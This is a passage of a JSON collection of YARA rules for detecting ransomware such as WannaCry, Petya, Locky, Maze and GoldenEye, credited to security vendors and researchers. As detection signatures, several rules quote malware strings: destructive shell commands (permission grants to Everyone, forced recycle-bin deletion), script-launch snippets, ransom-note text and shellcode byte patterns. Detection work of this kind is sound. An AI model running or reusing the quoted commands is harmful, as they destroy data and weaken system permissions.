  "DMALocker": "rule DMALocker : ransom\n{\n    meta:\n    Description = \"Deteccion del ransomware DMA Locker desde la version 1.0 a la 4.0\"\n    ref = \"https://blog.malwarebytes.org/threat-analysis/2016/02/dma-locker-a-new-ransomware-but-no-reason-to-panic/\"\n    Author = \"SadFud\"\n    Date = \"30/05/2016\"\n    \n    strings:\n    $uno = { 41 42 43 58 59 5a 31 31 }\n\t  $dos = { 21 44 4d 41 4c 4f 43 4b }\n\t  $tres = { 21 44 4d 41 4c 4f 43 4b 33 2e 30 }\n\t  $cuatro = { 21 44 4d 41 4c 4f 43 4b 34 2e 30 }\n    \n    condition:\n    any of them\n    \n}",
  "DMALocker4": "rule DMALocker4 : ransom {\n\n    meta:\n    Description = \"Deteccion del ransomware DMA Locker version 4.0\"\n    ref = \"https://blog.malwarebytes.org/threat-analysis/2016/02/dma-locker-a-new-ransomware-but-no-reason-to-panic/\"\n    Author = \"SadFud\"\n    Date = \"30/05/2016\"\n\tHash = \"e3106005a0c026fc969b46c83ce9aeaee720df1bb17794768c6c9615f083d5d1\"\n    \n    strings:\n    $clave = { 21 44 4d 41 4c 4f 43 4b 34 2e 30 }\n    \n    condition:\n    $clave \n    \n}",
  "DoublePulsarXor_Petya": "rule DoublePulsarXor_Petya\n{\n meta:\n   description = \"Rule to hit on the XORed DoublePulsar shellcode\"\n   author = \"Patrick Jones\"\n   company = \"Booz Allen Hamilton\"\n   reference1 =\"https://www.boozallen.com/s/insight/publication/the-petya-ransomware-outbreak.html\"\n   reference2 = \"https://www.boozallen.com/content/dam/boozallen_site/sig/pdf/white-paper/rollup-of-booz-allen-petya-research.pdf\"\n   date = \"2017-06-28\"\n   hash = \"027cc450ef5f8c5f653329641ec1fed91f694e0d229928963b30f6b0d7d3a745\"\n   hash = \"64b0b58a2c030c77fdb2b537b2fcc4af432bc55ffb36599a31d418c7c69e94b1\"\n strings:\n   $DoublePulsarXor_Petya = { FD 0C 8C 5C B8 C4 24 C5 CC CC CC 0E E8 CC 24 6B CC CC CC 0F 24 CD CC CC CC 27 5C 97 75 BA CD CC CC C3 FE }\n condition:\n   $DoublePulsarXor_Petya\n}",
  "DoublePulsarDllInjection_Petya": "rule DoublePulsarDllInjection_Petya\n{\n meta:\n  description = \"Rule to hit on the XORed DoublePulsar DLL injection shellcode\"\n  author = \"Patrick Jones\"\n  company = \"Booz Allen Hamilton\"\n  reference1 =\"https://www.boozallen.com/s/insight/publication/the-petya-ransomware-outbreak.html\"\n  reference2 = \"https://www.boozallen.com/content/dam/boozallen_site/sig/pdf/white-paper/rollup-of-booz-allen-petya-research.pdf\"\n  date = \"2017-06-28\"\n  hash = \"027cc450ef5f8c5f653329641ec1fed91f694e0d229928963b30f6b0d7d3a745\"\n  hash = \"64b0b58a2c030c77fdb2b537b2fcc4af432bc55ffb36599a31d418c7c69e94b1\" \n strings:\n   $DoublePulsarDllInjection_Petya = { 45 20 8D 93 8D 92 8D 91 8D 90 92 93 91 97 0F 9F 9E 9D 99 84 45 29 84 4D 20 CC CD CC CC 9B 84 45 03 84 45 14 84 45 49 CC 33 33 33 24 77 CC CC CC 84 45 49 C4 33 33 33 24 84 CD CC CC 84 45 49 DC 33 33 33 84 47 49 CC 33 33 33 84 47 41 }\n condition:\n   $DoublePulsarDllInjection_Petya\n}",
  "Erebus": "rule Erebus: ransom\n{\n\tmeta:\n\t\tdescription = \"Erebus Ransomware\"\n\t\tauthor = \"Joan Soriano / @joanbtl\"\n\t\tdate = \"2017-06-23\"\n\t\tversion = \"1.0\"\n\t\tMD5 = \"27d857e12b9be5d43f935b8cc86eaabf\"\n\t\tSHA256 = \"0b7996bca486575be15e68dba7cbd802b1e5f90436ba23f802da66292c8a055f\"\n\t\tref1 = \"http://blog.trendmicro.com/trendlabs-security-intelligence/erebus-resurfaces-as-linux-ransomware/\"\n\tstrings:\n\t\t$a = \"/{5f58d6f0-bb9c-46e2-a4da-8ebc746f24a5}//log.log\"\n\t\t$b = \"EREBUS IS BEST.\"\n\tcondition:\n\t\tall of them\n}",
  "crime_ransomware_windows_GPGQwerty": "rule crime_ransomware_windows_GPGQwerty: crime_ransomware_windows_GPGQwerty\n\n{\n\nmeta:\n\nauthor = \"McAfee Labs\"\n\ndescription = \"Detect GPGQwerty ransomware\"\n\nreference = \"https://securingtomorrow.mcafee.com/mcafee-labs/ransomware-takes-open-source-path-encrypts-gnu-privacy-guard/\"\n\nstrings:\n\n$a = \"gpg.exe \u2013recipient qwerty  -o\"\n\n$b = \"%s%s.%d.qwerty\"\n\n$c = \"del /Q /F /S %s$recycle.bin\"\n\n$d = \"cryz1@protonmail.com\"\n\ncondition:\n\nall of them\n\n}",
  "GoldenEye_Ransomware_XLS": "rule GoldenEye_Ransomware_XLS {\n   meta:\n      description = \"GoldenEye XLS with Macro - file Schneider-Bewerbung.xls\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/jp2SkT\"\n      date = \"2016-12-06\"\n      hash1 = \"2320d4232ee80cc90bacd768ba52374a21d0773c39895b88cdcaa7782e16c441\"\n   strings:\n      $x1 = \"fso.GetTempName();tmp_path = tmp_path.replace('.tmp', '.exe')\" fullword ascii\n      $x2 = \"var shell = new ActiveXObject('WScript.Shell');shell.run(t'\" fullword ascii\n   condition:\n      ( uint16(0) == 0xcfd0 and filesize < 4000KB and 1 of them )\n}",
  "GoldenEyeRansomware_Dropper_MalformedZoomit": "rule GoldenEyeRansomware_Dropper_MalformedZoomit {\n   meta:\n      description = \"Auto-generated rule - file b5ef16922e2c76b09edd71471dd837e89811c5e658406a8495c1364d0d9dc690\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/jp2SkT\"\n      date = \"2016-12-06\"\n      hash1 = \"b5ef16922e2c76b09edd71471dd837e89811c5e658406a8495c1364d0d9dc690\"\n   strings:\n      $s1 = \"ZoomIt - Sysinternals: www.sysinternals.com\" fullword ascii\n      $n1 = \"Mark Russinovich\" wide\n   condition:\n      ( uint16(0) == 0x5a4d and filesize < 800KB and $s1 and not $n1 )\n}",
  "Locky_Ransomware": "rule Locky_Ransomware : ransom {\n\tmeta:\n\t\tdescription = \"Detects Locky Ransomware (matches also on Win32/Kuluoz)\"\n\t\tauthor = \"Florian Roth (with the help of binar.ly)\"\n\t\treference = \"https://goo.gl/qScSrE\"\n\t\tdate = \"2016-02-17\"\n\t\thash = \"5e945c1d27c9ad77a2b63ae10af46aee7d29a6a43605a9bfbf35cebbcff184d8\"\n\tstrings:\n\t\t$o1 = { 45 b8 99 f7 f9 0f af 45 b8 89 45 b8 } // address=0x4144a7\n\t\t$o2 = { 2b 0a 0f af 4d f8 89 4d f8 c7 45 } // address=0x413863\n\tcondition:\n\t\tall of ($o*)\n}",
  "Locky_Ransomware_2": "rule Locky_Ransomware_2: ransom {\nmeta:\n    description = \"Regla para detectar RANSOM.LOCKY\"\n    author = \"CCN-CERT\"\n    version = \"1.0\"\nstrings:\n    $a1 = { 2E 00 6C 00 6F 00 63 00 6B 00 79 00 00 }\n    $a2 = { 00 5F 00 4C 00 6F 00 63 00 6B 00 79 00 }\n    $a3 = { 5F 00 72 00 65 00 63 00 6F 00 76 00 65 }\n    $a4 = { 00 72 00 5F 00 69 00 6E 00 73 00 74 00 }\n    $a5 = { 72 00 75 00 63 00 74 00 69 00 6F 00 6E }\n    $a6 = { 00 73 00 2E 00 74 00 78 00 74 00 00 }\n    $a7 = { 53 6F 66 74 77 61 72 65 5C 4C 6F 63 6B 79 00 }\ncondition:\n    all of them\n}",
  "MS17_010_WanaCry_worm": "rule MS17_010_WanaCry_worm {\n\tmeta:\n\t\tdescription = \"Worm exploiting MS17-010 and dropping WannaCry Ransomware\"\n\t\tauthor = \"Felipe Molina (@felmoltor)\"\n\t\treference = \"https://www.exploit-db.com/exploits/41987/\"\n\t\tdate = \"2017/05/12\"\n\tstrings:\n\t\t$ms17010_str1=\"PC NETWORK PROGRAM 1.0\"\n\t\t$ms17010_str2=\"LANMAN1.0\"\n\t\t$ms17010_str3=\"Windows for Workgroups 3.1a\"\n\t\t$ms17010_str4=\"__TREEID__PLACEHOLDER__\"\n\t\t$ms17010_str5=\"__USERID__PLACEHOLDER__\"\n\t\t$wannacry_payload_substr1 = \"h6agLCqPqVyXi2VSQ8O6Yb9ijBX54j\"\n\t\t$wannacry_payload_substr2 = \"h54WfF9cGigWFEx92bzmOd0UOaZlM\"\n\t\t$wannacry_payload_substr3 = \"tpGFEoLOU6+5I78Toh/nHs/RAP\"\n\n\tcondition:\n\t\tall of them\n}",
  "WannaDecryptor": "rule WannaDecryptor: WannaDecryptor\n{\n        meta:\n                description = \"Detection for common strings of WannaDecryptor\"\n \n        strings:\n                $id1 = \"taskdl.exe\"\n                $id2 = \"taskse.exe\"\n                $id3 = \"r.wnry\"\n                $id4 = \"s.wnry\"\n                $id5 = \"t.wnry\"\n                $id6 = \"u.wnry\"\n                $id7 = \"msg/m_\"\n \n        condition:\n                3 of them\n}",
  "Wanna_Sample_84c82835a5d21bbcf75a61706d8ab549": "rule Wanna_Sample_84c82835a5d21bbcf75a61706d8ab549: Wanna_Sample_84c82835a5d21bbcf75a61706d8ab549\n{\n        meta:\n                description = \"Specific sample match for WannaCryptor\"\n                MD5 = \"84c82835a5d21bbcf75a61706d8ab549\"\n                SHA1 = \"5ff465afaabcbf0150d1a3ab2c2e74f3a4426467\"\n                SHA256 = \"ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa\"\n                INFO = \"Looks for 'taskdl' and 'taskse' at known offsets\"\n \n        strings:\n                $taskdl = { 00 74 61 73 6b 64 6c }\n                $taskse = { 00 74 61 73 6b 73 65 }\n \n        condition:\n                $taskdl at 3419456 and $taskse at 3422953\n}",
  "Wanna_Sample_4da1f312a214c07143abeeafb695d904": "rule Wanna_Sample_4da1f312a214c07143abeeafb695d904: Wanna_Sample_4da1f312a214c07143abeeafb695d904\n{\n        meta:\n                description = \"Specific sample match for WannaCryptor\"\n                MD5 = \"4da1f312a214c07143abeeafb695d904\"\n                SHA1 = \"b629f072c9241fd2451f1cbca2290197e72a8f5e\"\n                SHA256 = \"aee20f9188a5c3954623583c6b0e6623ec90d5cd3fdec4e1001646e27664002c\"\n                INFO = \"Looks for offsets of r.wry and s.wry instances\"\n \n        strings:\n                $rwnry = { 72 2e 77 72 79 }\n                $swnry = { 73 2e 77 72 79 }\n \n        condition:\n                $rwnry at 88195 and $swnry at 88656 and $rwnry at 4495639\n}",
  "NHS_Strain_Wanna": "rule NHS_Strain_Wanna: NHS_Strain_Wanna\n{\n        meta:\n                description = \"Detection for worm-strain bundle of Wcry, DOublePulsar\"\n                MD5 = \"db349b97c37d22f5ea1d1841e3c89eb4\"\n                SHA1 = \"e889544aff85ffaf8b0d0da705105dee7c97fe26\"\n                SHA256 = \"24d004a104d4d54034dbcffc2a4b19a11f39008a575aa614ea04703480b1022c\"\n                INFO = \"Looks for specific offsets of c.wnry and t.wnry strings\"\n \n        strings:\n                $cwnry = { 63 2e 77 6e 72 79 }\n                $twnry = { 74 2e 77 6e 72 79 }\n \n        condition:\n                $cwnry at 262324 and $twnry at 267672 and $cwnry at 284970\n}",
  "ransom_telefonica": "rule ransom_telefonica : TELEF\n{\n  meta:\n    author = \"Jaume Martin <@Xumeiquer>\"\n    description = \"Ransmoware Telefonica\"\n    date = \"2017-05-13\"\n    reference = \"http://www.elmundo.es/tecnologia/2017/05/12/59158a8ce5fdea194f8b4616.html\"\n    md5 = \"7f7ccaa16fb15eb1c7399d422f8363e8\"\n    sha256 = \"2584e1521065e45ec3c17767c065429038fc6291c091097ea8b22c8a502c41dd\"\n  strings:\n    $a = \"RegCreateKeyW\" wide ascii nocase\n    $b = \"cmd.exe /c\"\n    $c = \"115p7UMMngoj1pMvkpHijcRdfJNXj6LrLn\" ascii\n    $d = \"12t9YDPgwueZ9NyMgw519p7AA8isjr6SMw\" ascii\n    $e = \"13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94\" ascii\n    $f = \"tasksche.exe\"\n  condition:\n    uint16(0) == 0x5A4D and $a and for all of ($b, $c, $d, $e, $f) : (@ > @a)\n}",
  "Wanna_Cry_Ransomware_Generic": "rule Wanna_Cry_Ransomware_Generic {\n       meta:\n              description = \"Detects WannaCry Ransomware on Disk and in Virtual Page\"\n              author = \"US-CERT Code Analysis Team\"\n              reference = \"not set\"                                        \n              date = \"2017/05/12\"\n       hash0 = \"4DA1F312A214C07143ABEEAFB695D904\"\n       strings:\n              $s0 = {410044004D0049004E0024}\n              $s1 = \"WannaDecryptor\"\n              $s2 = \"WANNACRY\"\n              $s3 = \"Microsoft Enhanced RSA and AES Cryptographic\"\n              $s4 = \"PKS\"\n              $s5 = \"StartTask\"\n              $s6 = \"wcry@123\"\n              $s7 = {2F6600002F72}\n              $s8 = \"unzip 0.15 Copyrigh\"\n              $s9 = \"Global\\\\WINDOWS_TASKOSHT_MUTEX\"        \n              $s10 = \"Global\\\\WINDOWS_TASKCST_MUTEX\"   \n             $s11 = {7461736B736368652E657865000000005461736B5374617274000000742E776E7279000069636163}\n             $s12 = {6C73202E202F6772616E742045766572796F6E653A46202F54202F43202F5100617474726962202B68}\n             $s13 = \"WNcry@2ol7\"\n             $s14 = \"wcry@123\"\n             $s15 = \"Global\\\\MsWinZonesCacheCounterMutexA\"\n       condition:\n              $s0 and $s1 and $s2 and $s3 or $s4 and $s5 and $s6 and $s7 or $s8 and $s9 and $s10 or $s11 and $s12 or $s13 or $s14 or $s15\n}",
  "WannaCry_Ransomware": "rule WannaCry_Ransomware {\n   meta:\n      description = \"Detects WannaCry Ransomware\"\n      author = \"Florian Roth (with the help of binar.ly)\"\n      reference = \"https://goo.gl/HG2j5T\"\n      date = \"2017-05-12\"\n      hash1 = \"ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa\"\n   strings:\n      $x1 = \"icacls . /grant Everyone:F /T /C /Q\" fullword ascii\n      $x2 = \"taskdl.exe\" fullword ascii\n      $x3 = \"tasksche.exe\" fullword ascii\n      $x4 = \"Global\\\\MsWinZonesCacheCounterMutexA\" fullword ascii\n      $x5 = \"WNcry@2ol7\" fullword ascii\n      $x6 = \"www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com\" ascii\n      $x7 = \"mssecsvc.exe\" fullword ascii\n      $x8 = \"C:\\\\%s\\\\qeriuwjhrf\" fullword ascii\n      $x9 = \"icacls . /grant Everyone:F /T /C /Q\" fullword ascii\n\n      $s1 = \"C:\\\\%s\\\\%s\" fullword ascii\n      $s2 = \"<!-- Windows 10 --> \" fullword ascii\n      $s3 = \"cmd.exe /c \\\"%s\\\"\" fullword ascii\n      $s4 = \"msg/m_portuguese.wnry\" fullword ascii\n      $s5 = \"\\\\\\\\192.168.56.20\\\\IPC$\" fullword wide\n      $s6 = \"\\\\\\\\172.16.99.5\\\\IPC$\" fullword wide\n\n      $op1 = { 10 ac 72 0d 3d ff ff 1f ac 77 06 b8 01 00 00 00 }\n      $op2 = { 44 24 64 8a c6 44 24 65 0e c6 44 24 66 80 c6 44 }\n      $op3 = { 18 df 6c 24 14 dc 64 24 2c dc 6c 24 5c dc 15 88 }\n      $op4 = { 09 ff 76 30 50 ff 56 2c 59 59 47 3b 7e 0c 7c }\n      $op5 = { c1 ea 1d c1 ee 1e 83 e2 01 83 e6 01 8d 14 56 }\n      $op6 = { 8d 48 ff f7 d1 8d 44 10 ff 23 f1 23 c1 }\n   condition:\n      uint16(0) == 0x5a4d and filesize < 10000KB and ( 1 of ($x*) and 1 of ($s*) or 3 of ($op*) )\n}",
  "WannaCry_Ransomware_Gen": "rule WannaCry_Ransomware_Gen {\n   meta:\n      description = \"Detects WannaCry Ransomware\"\n      author = \"Florian Roth (based on rule by US CERT)\"\n      reference = \"https://www.us-cert.gov/ncas/alerts/TA17-132A\"\n      date = \"2017-05-12\"\n      hash1 = \"9fe91d542952e145f2244572f314632d93eb1e8657621087b2ca7f7df2b0cb05\"\n      hash2 = \"8e5b5841a3fe81cade259ce2a678ccb4451725bba71f6662d0cc1f08148da8df\"\n      hash3 = \"4384bf4530fb2e35449a8e01c7e0ad94e3a25811ba94f7847c1e6612bbb45359\"\n   strings:\n      $s1 = \"__TREEID__PLACEHOLDER__\" fullword ascii\n      $s2 = \"__USERID__PLACEHOLDER__\" fullword ascii\n      $s3 = \"Windows for Workgroups 3.1a\" fullword ascii\n      $s4 = \"PC NETWORK PROGRAM 1.0\" fullword ascii\n      $s5 = \"LANMAN1.0\" fullword ascii\n   condition:\n      uint16(0) == 0x5a4d and filesize < 5000KB and all of them\n}",
  "WannCry_m_vbs": "rule WannCry_m_vbs {\n   meta:\n      description = \"Detects WannaCry Ransomware VBS\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/HG2j5T\"\n      date = \"2017-05-12\"\n      hash1 = \"51432d3196d9b78bdc9867a77d601caffd4adaa66dcac944a5ba0b3112bbea3b\"\n   strings:\n      $x1 = \".TargetPath = \\\"C:\\\\@\" ascii\n      $x2 = \".CreateShortcut(\\\"C:\\\\@\" ascii\n      $s3 = \" = WScript.CreateObject(\\\"WScript.Shell\\\")\" ascii\n   condition:\n      ( uint16(0) == 0x4553 and filesize < 1KB and all of them )\n}",
  "WannCry_BAT": "rule WannCry_BAT {\n   meta:\n      description = \"Detects WannaCry Ransomware BATCH File\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/HG2j5T\"\n      date = \"2017-05-12\"\n      hash1 = \"f01b7f52e3cb64f01ddc248eb6ae871775ef7cb4297eba5d230d0345af9a5077\"\n   strings:\n      $s1 = \"@.exe\\\">> m.vbs\" ascii\n      $s2 = \"cscript.exe //nologo m.vbs\" fullword ascii\n      $s3 = \"echo SET ow = WScript.CreateObject(\\\"WScript.Shell\\\")> \" ascii\n      $s4 = \"echo om.Save>> m.vbs\" fullword ascii\n   condition:\n      ( uint16(0) == 0x6540 and filesize < 1KB and 1 of them )\n}",
  "WannaCry_RansomNote": "rule WannaCry_RansomNote {\n   meta:\n      description = \"Detects WannaCry Ransomware Note\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/HG2j5T\"\n      date = \"2017-05-12\"\n      hash1 = \"4a25d98c121bb3bd5b54e0b6a5348f7b09966bffeec30776e5a731813f05d49e\"\n   strings:\n      $s1 = \"A:  Don't worry about decryption.\" fullword ascii\n      $s2 = \"Q:  What's wrong with my files?\" fullword ascii\n   condition:\n      ( uint16(0) == 0x3a51 and filesize < 2KB and all of them )\n}",
  "lazaruswannacry": "rule lazaruswannacry {\n   meta:\n      description = \"Rule based on shared code between Feb 2017 Wannacry sample and Lazarus backdoor from Feb 2015 discovered by Neel Mehta\"\n      date = \"2017-05-15\"\n      reference = \"https://twitter.com/neelmehta/status/864164081116225536\"\n      author = \"Costin G. Raiu, Kaspersky Lab\"\n      version = \"1.0\"\n      hash = \"9c7c7149387a1c79679a87dd1ba755bc\"\n      hash = \"ac21c8ad899727137c4b94458d7aa8d8\"\n   strings:\n      $a1 = { 51 53 55 8B 6C 24 10 56 57 6A 20 8B 45 00 8D 75 04 24 01 0C 01 46 89 45 00 C6 46 FF 03 C6 06 01 46 56 E8 }\n      $a2 = { 03 00 04 00 05 00 06 00 08 00 09 00 0A 00 0D 00 10 00 11 00 12 00 13 00 14 00 15 00 16 00 2F 00 30 00 31 00 32 00 33 00 34 00 35 00 36 00 37 00 38 00 39 00 3C 00 3D 00 3E 00 3F 00 40 00 41 00 44 00 45 00 46 00 62 00 63 00 64 00 66 00 67 00 68 00 69 00 6A 00 6B 00 84 00 87 00 88 00 96 00 FF 00 01 C0 02 C0 03 C0 04 C0 05 C0 06 C0 07 C0 08 C0 09 C0 0A C0 0B C0 0C C0 0D C0 0E C0 0F C0 10 C0 11 C0 12 C0 13 C0 14 C0 23 C0 24 C0 27 C0 2B C0 2C C0 FF FE }\n   condition:\n      uint16(0) == 0x5A4D and filesize < 15000000 and all of them\n}",
  "WannaCry_Ransomware_Dropper": "rule WannaCry_Ransomware_Dropper\n {\n meta:\n\tdescription = \"WannaCry Ransomware Dropper\"\n \treference = \"https://www.cylance.com/en_us/blog/threat-spotlight-inside-the-wannacry-attack.html\"\n \tdate = \"2017-05-12\"\n\nstrings:\n\t$s1 = \"cmd.exe /c \\\"%s\\\"\" fullword ascii\n \t$s2 = \"tasksche.exe\" fullword ascii\n \t$s3 = \"icacls . /grant Everyone:F /T /C /Q\" fullword ascii\n \t$s4 = \"Global\\\\MsWinZonesCacheCounterMutexA\" fullword ascii\n \n condition:\n \tuint16(0) == 0x5a4d and filesize < 4MB and all of them\n}",
  "WannaCry_SMB_Exploit": "rule WannaCry_SMB_Exploit\n{\n meta:\n \tdescription = \"WannaCry SMB Exploit\"\n \treference = \"https://www.cylance.com/en_us/blog/threat-spotlight-inside-the-wannacry-attack.html\"\n \tdate = \"2017-05-12\"\n \n strings:\n \t$s1 = { 53 4D 42 72 00 00 00 00 18 53 C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 FF FE 00 00 40 00 00 62 00 02 50 43 20 4E 45 54 57 4F 52 4B 20 50 52 4F 47 52 41 4D 20 31 2E 30 00 02 4C 41 4E 4D 41 4E 31 2E 30 00 02 57 69 6E 64 6F 77 73 20 66 6F 72 20 57 6F 72 6B 67 72 6F 75 70 73 20 33 2E 31 61 00 02 4C 4D 31 2E 32 58 30 30 32 00 02 4C 41 4E 4D 41 4E 32 2E 31 00 02 4E 54 20 4C 4D 20 30 2E 31 32 00 00 00 00 00 00 00 88 FF 53 4D 42 73 00 00 00 00 18 07 C0 }\n \n condition:\n \tuint16(0) == 0x5a4d and filesize < 4MB and all of them and pe.imports(\"ws2_32.dll\", \"connect\") and pe.imports(\"ws2_32.dll\", \"send\") and pe.imports(\"ws2_32.dll\", \"recv\") and pe.imports(\"ws2_32.dll\", \"socket\") and pe.imports(\"ws2_32.dll\", \"closesocket\")\n }",
  "wannacry_static_ransom": "rule wannacry_static_ransom : wannacry_static_ransom {\n\nmeta:\n\ndescription = \"Detects WannaCryptor spreaded during 2017-May-12th campaign and variants\"\n\nauthor = \"Blueliv\"\n\nreference = \"https://blueliv.com/research/wannacrypt-malware-analysis/\"\n\ndate = \"2017-05-15\"\n\nstrings:\n\n$mutex01 = \"Global\\\\MsWinZonesCacheCounterMutexA\" ascii\n\n$lang01 = \"m_bulgarian.wnr\" ascii\n\n$lang02 = \"m_vietnamese.wnry\" ascii\n\n$startarg01 = \"StartTask\" ascii\n\n$startarg02 = \"TaskStart\" ascii\n\n$startarg03 = \"StartSchedule\" ascii\n\n$wcry01 = \"WanaCrypt0r\" ascii wide\n\n$wcry02 = \"WANACRY\" ascii\n\n$wcry03 = \"WANNACRY\" ascii\n\n$wcry04 = \"WNCRYT\" ascii wide\n\n$forig01 = \".wnry\\x00\" ascii\n\n$fvar01 = \".wry\\x00\" ascii\n\ncondition:\n\n($mutex01 or any of ($lang*)) and ( $forig01 or all of ($fvar*) ) and any of ($wcry*) and any of ($startarg*)\n\n}",
  "wannacry_memory_ransom": "rule wannacry_memory_ransom : wannacry_memory_ransom {\n\nmeta:\n\ndescription = \"Detects WannaCryptor spreaded during 2017-May-12th campaign and variants in memory\"\n\nauthor = \"Blueliv\"\n\nreference = \"https://blueliv.com/research/wannacrypt-malware-analysis/\"\n\ndate = \"2017-05-15\"\n\nstrings:\n\n$s01 = \"%08X.eky\"\n\n$s02 = \"%08X.pky\"\n\n$s03 = \"%08X.res\"\n\n$s04 = \"%08X.dky\"\n\n$s05 = \"@WanaDecryptor@.exe\"\n\ncondition:\n\nall of them\n\n}",
  "worm_ms17_010": "rule worm_ms17_010 : worm_ms17_010 {\n\nmeta:\n\ndescription = \"Detects Worm used during 2017-May-12th WannaCry campaign, which is based on ETERNALBLUE\"\n\nauthor = \"Blueliv\"\n\nreference = \"https://blueliv.com/research/wannacrypt-malware-analysis/\"\n\ndate = \"2017-05-15\"\n\nstrings:\n\n$s01 = \"__TREEID__PLACEHOLDER__\" ascii\n\n$s02 = \"__USERID__PLACEHOLDER__@\" ascii\n\n$s03 = \"SMB3\"\n\n$s05 = \"SMBu\"\n\n$s06 = \"SMBs\"\n\n$s07 = \"SMBr\"\n\n$s08 = \"%s -m security\" ascii\n\n$s09 = \"%d.%d.%d.%d\"\n\n$payloadwin2000_2195 =\n\n\"\\x57\\x00\\x69\\x00\\x6e\\x00\\x64\\x00\\x6f\\x00\\x77\\x00\\x73\\x00\\x20\\x00\\x32\\x00\\x30\\x00\\x30\\x00\\x30\\x00\\x20\\x00\\x32\\x00\\x31\\x00\\x39\\x00\\x35\\x00\\x00\\x00\"\n\n$payload2000_50 =\n\n\"\\x57\\x00\\x69\\x00\\x6e\\x00\\x64\\x00\\x6f\\x00\\x77\\x00\\x73\\x00\\x20\\x00\\x32\\x00\\x30\\x00\\x30\\x00\\x30\\x00\\x20\\x00\\x35\\x00\\x2e\\x00\\x30\\x00\\x00\\x00\"\n\ncondition:\n\nall of them\n\n}",
  "Maze": "rule Maze\n{\nmeta:\n\tdescription = \"Identifies Maze ransomware in memory or unpacked.\"\n\tauthor = \"@bartblaze\"\n\tdate = \"2019-11\"\n\ttlp = \"White\"\n\nstrings:\t\n\t$ = \"Enc: %s\" ascii wide\n\t$ = \"Encrypting whole system\" ascii wide\n\t$ = \"Encrypting specified folder in --path parameter...\" ascii wide\n\t$ = \"!Finished in %d ms!\" ascii wide\n\t$ = \"--logging\" ascii wide\n\t$ = \"--nomutex\" ascii wide\n\t$ = \"--noshares\" ascii wide\n\t$ = \"--path\" ascii wide\n\t$ = \"Logging enabled | Maze\" ascii wide\n\t$ = \"NO SHARES | \" ascii wide\n\t$ = \"NO MUTEX | \" ascii wide\n\t$ = \"Encrypting:\" ascii wide\n\t$ = \"You need to buy decryptor in order to restore the files.\" ascii wide\n\t$ = \"Dear %s, your files have been encrypted by RSA-2048 and ChaCha algorithms\" ascii wide\n\t$ = \"%s! Alert! %s! Alert! Dear %s Your files have been encrypted by %s! Attention! %s\" ascii wide\n\t$ = \"DECRYPT-FILES.txt\" ascii wide fullword\n\ncondition:\n\t5 of them\n}",
  "ransomware_PetrWrap": "rule ransomware_PetrWrap \n{\nmeta:\n\tcopyright= \"Kaspersky Lab\"\n\tdescription = \"Rule to detect PetrWrap ransomware samples\"\n    reference = \"https://securelist.com/schroedingers-petya/78870/\"\n\tlast_modified = \"2017-06-27\"\n\tauthor = \"Kaspersky Lab\"\n\thash = \"71B6A493388E7D0B40C83CE903BC6B04\"\n\tversion = \"1.0\"\nstrings:\n\t$a1 = \"MIIBCgKCAQEAxP/VqKc0yLe9JhVqFMQGwUITO6WpXWnKSNQAYT0O65Cr8PjIQInTeHkXEjfO2n2JmURWV/uHB0ZrlQ/wcYJBwLhQ9EqJ3iDqmN19Oo7NtyEUmbYmopcqYLIBZzQ2ZTK0A2DtX4GRKxEEFLCy7vP12EYOPXknVy/mf0JFWixz29QiTf5oLu15wVLONCuEibGaNNpgqCXsPwfITDbDDmdrRIiUEUw6o3pt5pNOskfOJbMan2TZu\" fullword wide\n\t$a2 = \".3ds.7z.accdb.ai.asp.aspx.avhd.back.bak.c.cfg.conf.cpp.cs.ctl.dbf.disk.djvu.doc.docx.dwg.eml.fdb.gz.h.hdd.kdbx.mail.mdb.msg.nrg.ora.ost.ova.ovf.pdf.php.pmf.ppt.pptx.pst.pvi.py.pyc.rar.rtf.sln.sql.tar.vbox.vbs.vcb.vdi.vfd.vmc.vmdk.vmsd.vmx.vsdx.vsv.work.xls\" fullword wide\n\t$a3 = \"DESTROY ALL OF YOUR DATA PLEASE ENSURE THAT YOUR POWER CABLE IS PLUGGED\" fullword ascii\n\t$a4 = \"1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX\" fullword ascii\n\t$a5 = \"wowsmith123456posteo.net.\" fullword wide\ncondition:\n\tuint16(0) == 0x5A4D and filesize < 1000000 and any of them \n}",
  "Petya_Ransomware": "rule Petya_Ransomware {\n\tmeta:\n\t\tdescription = \"Detects Petya Ransomware\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://www.heise.de/newsticker/meldung/Erpressungs-Trojaner-Petya-riegelt-den-gesamten-Rechner-ab-3150917.html\"\n\t\tdate = \"2016-03-24\"\n\t\thash = \"26b4699a7b9eeb16e76305d843d4ab05e94d43f3201436927e13b3ebafa90739\"\n\tstrings:\n\t\t$a1 = \"<description>WinRAR SFX module</description>\" fullword ascii\n\n\t\t$s1 = \"BX-Proxy-Manual-Auth\" fullword wide\n\t\t$s2 = \"<!--The ID below indicates application support for Windows 10 -->\" fullword ascii\n\t\t$s3 = \"X-HTTP-Attempts\" fullword wide\n\t\t$s4 = \"@CommandLineMode\" fullword wide\n\t\t$s5 = \"X-Retry-After\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 500KB and $a1 and 3 of ($s*)\n}",
  "Ransom_Petya": "rule Ransom_Petya {\nmeta:\n    description = \"Regla para detectar Ransom.Petya con md5 AF2379CC4D607A45AC44D62135FB7015\"\n    author = \"CCN-CERT\"\n    version = \"1.0\"\nstrings:\n    $a1 = { C1 C8 14 2B F0 03 F0 2B F0 03 F0 C1 C0 14 03 C2 }\n    $a2 = { 46 F7 D8 81 EA 5A 93 F0 12 F7 DF C1 CB 10 81 F6 }\n    $a3 = { 0C 88 B9 07 87 C6 C1 C3 01 03 C5 48 81 C3 A3 01 00 00 }\ncondition:\n    all of them\n}",
